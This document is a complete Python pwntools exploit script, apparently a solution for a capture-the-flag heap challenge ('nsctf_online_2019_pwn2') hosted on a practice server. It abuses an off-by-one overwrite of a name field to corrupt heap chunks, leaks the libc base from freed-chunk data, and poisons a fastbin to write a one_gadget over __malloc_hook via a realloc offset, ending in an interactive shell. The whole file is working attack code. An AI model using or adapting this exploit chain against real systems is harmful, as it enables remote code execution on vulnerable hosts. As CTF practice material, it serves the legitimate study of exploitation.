from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('nsctf_online_2019_pwn2')
io = remote('node4.buuoj.cn', 26012)
# libc = ELF('/mnt/hgfs/payoung/Documents/ctf/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')
libc = ELF('libc-2.23.so')
elf = ELF('nsctf_online_2019_pwn2')
# one_gadgets_1604 = [0x45226, 0x4527a, 0xf03a4, 0xf1247]
one_gadgets_1604 = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

def add(size):
    io.sendlineafter('6.exit\n', '1')
    io.sendlineafter('Input the size\n', str(size))


def delete():
    io.sendlineafter('6.exit\n', '2')


def show():
    io.sendlineafter('6.exit\n', '3')
    return io.recvline()[:-1]


def edit_name(name):
    io.sendlineafter('6.exit\n', '4')
    io.sendafter('Please input your name\n', name)


def edit(note):
    io.sendlineafter('6.exit\n', '5')
    io.sendafter('Input the note\n', note)


def pwn():
    io.sendafter('Please input your name\n', 'a' * 0x30)
    add(0x18)
    delete()
    add(0x88)
    payload = b'a' * 0x60 + p64(0) + p64(0x21)
    edit(payload)
    add(0x28)
    delete()
    add(0x38)
    delete()
    add(0x28)
    edit_name(b'a' * 0x30 + b'\x30')
    delete()
    add(0x18)
    edit_name(b'a' * 0x30 + b'\x30')
    libc_base = u64(show().ljust(8, b'\x00')) - libc.sym['__malloc_hook'] - 0x68
    log.success('libc_base: ' + hex(libc_base))
    edit_name(b'a' * 0x30 + b'\x20')
    payload = p64(0) + p64(0x71)
    edit(payload)
    edit_name(b'a' * 0x30 + b'\x30')
    delete()
    add(0x38)
    edit_name(b'a' * 0x30 + b'\x30')
    __malloc_hook = libc_base + libc.sym['__malloc_hook']
    edit(p64(__malloc_hook - 0x23))
    add(0x68)
    add(0x59)
    one_gadget = libc_base + one_gadgets_1604[3]
    realloc = libc_base + libc.sym['realloc']
    payload = b'a' * 0xb + p64(one_gadget) + p64(realloc + 20)
    edit(payload)
    # gdb.attach(io)
    add(1)
    # pause()
    io.interactive()


if __name__ == '__main__':
    pwn() 
